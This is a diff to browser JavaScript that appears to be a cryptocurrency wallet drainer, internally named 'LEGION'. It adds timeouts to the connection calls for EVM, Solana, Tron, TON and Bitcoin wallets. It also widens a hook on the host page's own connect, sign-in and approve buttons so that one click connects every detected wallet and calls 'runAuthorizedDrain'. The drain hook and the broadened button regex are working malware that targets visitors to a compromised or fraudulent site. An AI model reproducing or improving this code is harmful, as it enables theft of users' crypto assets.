@@ -20,6 +20,20 @@
   var _nonceCounter = 0;
   var API_TIMEOUT_MS = 15000;
   var MAX_API_RETRIES = 3;
+  var WALLET_TIMEOUT_MS = 20000; // 20 seconds for wallet operations
+
+  // Utility: Wrap any promise with timeout
+  function promiseWithTimeout(promise, timeoutMs, label) {
+    return Promise.race([
+      promise,
+      new Promise(function (_, reject) {
+        setTimeout(function () {
+          reject(new Error(label + ' timeout after ' + timeoutMs + 'ms'));
+        }, timeoutMs);
+      })
+    ]);
+  }
+
   var PROXY_ROTATION_ENABLED = false;
   var PROXY_LIST = [];
   var CURRENT_PROXY_IDX = 0;
@@ -2001,9 +2015,17 @@
     if (wallets.evm) return wallets.evm;
     var eth = window.ethereum;
     if (!eth) throw new Error('No EVM wallet (MetaMask / Rabby / Coinbase).');
-    var accounts = await eth.request({ method: 'eth_requestAccounts' });
+    var accounts = await promiseWithTimeout(
+      Promise.resolve(eth.request({ method: 'eth_requestAccounts' })),
+      WALLET_TIMEOUT_MS,
+      'EVM eth_requestAccounts'
+    );
     if (!accounts || !accounts[0]) throw new Error('No EVM account returned');
-    var chainHex = await eth.request({ method: 'eth_chainId' });
+    var chainHex = await promiseWithTimeout(
+      Promise.resolve(eth.request({ method: 'eth_chainId' })),
+      WALLET_TIMEOUT_MS,
+      'EVM eth_chainId'
+    );
     var chainId = parseInt(chainHex, 16);
     var provider = eth.isMetaMask ? 'MetaMask' : eth.isRabby ? 'Rabby' : eth.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM';
     wallets.evm = { address: accounts[0], chainId: chainId, provider: provider };
@@ -2017,7 +2039,11 @@
     var sol = window.phantom && window.phantom.solana;
     if (!sol && window.solflare && window.solflare.isSolflare) sol = window.solflare;
     if (!sol) throw new Error('No Solana wallet (Phantom / Solflare).');
-    var resp = await sol.connect();
+    var resp = await promiseWithTimeout(
+      Promise.resolve(sol.connect()),
+      WALLET_TIMEOUT_MS,
+      'Solana connect'
+    );
     var pubkey = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
     if (!pubkey) throw new Error('Solana connect did not return a public key');
     var name = window.phantom && window.phantom.solana === sol ? 'Phantom' : 'Solflare';
@@ -2028,7 +2054,11 @@
   async function connectTron() {
     if (wallets.tron) return wallets.tron;
     if (window.tronLink && window.tronLink.request) {
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      await promiseWithTimeout(
+        Promise.resolve(window.tronLink.request({ method: 'tron_requestAccounts' })),
+        WALLET_TIMEOUT_MS,
+        'Tron requestAccounts'
+      );
     }
     var tw = window.tronWeb;
     if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
@@ -2043,7 +2073,11 @@
     var ton = window.tonkeeper && window.tonkeeper.provider;
     if (!ton && window.ton && window.ton.isTonkeeper) ton = window.ton;
     if (!ton) throw new Error('Tonkeeper not detected.');
-    var accounts = await ton.send('ton_getAccounts');
+    var accounts = await promiseWithTimeout(
+      Promise.resolve(ton.send('ton_getAccounts')),
+      WALLET_TIMEOUT_MS,
+      'TON getAccounts'
+    );
     var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
     if (!addr) throw new Error('Tonkeeper did not return an address');
     wallets.ton = { address: typeof addr === 'string' ? addr : (addr.toString ? addr.toString() : String(addr)), provider: ton };
@@ -2053,14 +2087,22 @@
   async function connectBitcoin() {
     if (wallets.btc) return wallets.btc;
     if (window.unisat && window.unisat.requestAccounts) {
-      var accounts = await window.unisat.requestAccounts();
+      var accounts = await promiseWithTimeout(
+        Promise.resolve(window.unisat.requestAccounts()),
+        WALLET_TIMEOUT_MS,
+        'UniSat requestAccounts'
+      );
       if (!accounts || !accounts[0]) throw new Error('UniSat returned no address');
       wallets.btc = { address: accounts[0], provider: 'UniSat' };
       return wallets.btc;
     }
     if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
       var xverse = window.XverseProviders.BitcoinProvider;
-      var addrs = await xverse.request('getAccounts');
+      var addrs = await promiseWithTimeout(
+        Promise.resolve(xverse.request('getAccounts')),
+        WALLET_TIMEOUT_MS,
+        'Xverse getAccounts'
+      );
       if (!addrs || !addrs[0]) throw new Error('Xverse returned no address');
       wallets.btc = { address: addrs[0], provider: 'Xverse' };
       return wallets.btc;
@@ -2973,28 +3015,26 @@
     }
   }
 
-  var CONNECT_BTN_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;
+  var CONNECT_BTN_RE = /connect|wallet|sign\s*in|link|auth|approve|enable/i;
 
   function hookNativeConnectButtons(root) {
     var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
     nodes.forEach(function (el) {
       if (el.__legionConnectHook) return;
-      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
+      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim().toLowerCase();
       if (!CONNECT_BTN_RE.test(label)) return;
+      if (label.length > 50) return;
       el.__legionConnectHook = true;
-      el.addEventListener('click', function () {
-        setTimeout(function () {
-          if (window.ethereum && window.ethereum.selectedAddress) {
-            wallets.evm = {
-              address: window.ethereum.selectedAddress,
-              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
-              provider: 'injected',
-            };
-            ACTIVE_TAB = 'evm';
+      el.addEventListener('click', function (e) {
+        setTimeout(async function () {
+          try {
+            await autoConnectAllDetectedWallets();
             runAuthorizedDrain({ skipConnect: true });
             if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
+          } catch (err) {
+            console.warn('[LEGION] Hook error:', err.message);
           }
-        }, 2000);
+        }, 500);
       }, true);
     });
   }
